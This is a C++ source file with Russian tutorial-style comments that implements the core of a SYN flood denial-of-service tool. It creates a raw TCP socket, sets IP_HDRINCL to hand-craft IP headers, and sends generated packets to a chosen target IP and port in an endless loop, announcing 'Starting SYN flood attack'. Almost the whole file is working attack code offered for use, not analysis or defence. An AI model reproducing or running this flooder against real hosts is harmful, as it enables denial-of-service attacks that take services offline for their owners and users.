#include "attacker.hpp"
#include "packet.hpp"          // Наш генератор пакетов
#include <iostream>            // Для вывода
#include <sys/socket.h>        // Для socket(), setsockopt()
#include <netinet/in.h>        // Для struct sockaddr_in
#include <netinet/ip.h>        // Для IP_HDRINCL
#include <arpa/inet.h>         // Для struct sockaddr_in
#include <unistd.h>            // Для close()
#include <stdexcept>

CoreAttacker::CoreAttacker(const TargetInfo& target)
    : target_(target) 
{
    // При создании объекта сразу пытаемся открыть сокет
    create_raw_socket();
    set_socket_options();
}

// 1. Создание Сырого Сокета
void CoreAttacker::create_raw_socket() {
    // Протокол: IPPROTO_TCP. Тип: SOCK_RAW (сырой)
    // AF_INET: Используем протокол IPv4
    this->raw_socket_fd_ = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
    
    if (this->raw_socket_fd_ < 0) {
        throw std::runtime_error("Failed to create raw socket. Try running with 'sudo'.");
    }
    std::cout << "Raw socket created successfully (FD: " << this->raw_socket_fd_ << ")" << std::endl;
}

// 2. Установка Опций Сокета (Самый важный шаг!)
void CoreAttacker::set_socket_options() {
    int one = 1;
    const int* val = &one;
    
    // IP_HDRINCL: Мы говорим ядру ОС, что *мы* сами предоставим IP-заголовок
    // Ядро больше не будет создавать IP-заголовок, а просто примет наш буфер "как есть".
    if (setsockopt(this->raw_socket_fd_, IPPROTO_IP, IP_HDRINCL, val, sizeof(one)) < 0) {
        throw std::runtime_error("Failed to set IP_HDRINCL option.");
    }
}

// 3. Запуск Цикла Атаки
void CoreAttacker::start_flood() {
    PacketGenerator generator(target_);
    
    // Адрес назначения (нужен для функции sendto)
    struct sockaddr_in target_addr;
    target_addr.sin_family = AF_INET;
    target_addr.sin_port = htons(target_.port); // Порт не строго обязателен для RAW, но хорошая практика
    // inet_addr: преобразует IP-строку в сетевой 32-битный формат
    target_addr.sin_addr.s_addr = inet_addr(target_.ip.c_str());

    std::cout << "Starting SYN flood attack on " << target_.ip << ":" << target_.port << "..." << std::endl;
    
    // Бесконечный цикл - суть атаки
    while (true) {
        // 1. Получаем готовый сырой пакет (вектор байтов)
        std::vector<char> raw_packet = generator.get_raw_packet();
        
        // 2. Отправка пакета
        // sendto: отправляет данные через сокет, используя явный адрес назначения
        ssize_t sent_bytes = sendto(
            this->raw_socket_fd_,                   // Наш сырой сокет
            raw_packet.data(),                      // Указатель на начало буфера
            raw_packet.size(),                      // Размер пакета
            0,                                      // Флаги (0)
            (struct sockaddr*)&target_addr,         // Адрес назначения
            sizeof(target_addr)                     // Размер адреса
        );

        if (sent_bytes < 0) {
            std::cerr << "Error sending packet! (May be temporary)" << std::endl;
        } else {
            // Для профессионального кода: лучше использовать логгирование вместо std::cout
            // std::cout << "Sent " << sent_bytes << " bytes." << std::endl;
        }
        
        // Маленькая пауза, чтобы не перегрузить CPU
        // usleep(1); // 1 микросекунда. usleep устарел, используем std::this_thread::sleep_for
    }
    
    // В реальной жизни: нужен деструктор для close(raw_socket_fd_);
}
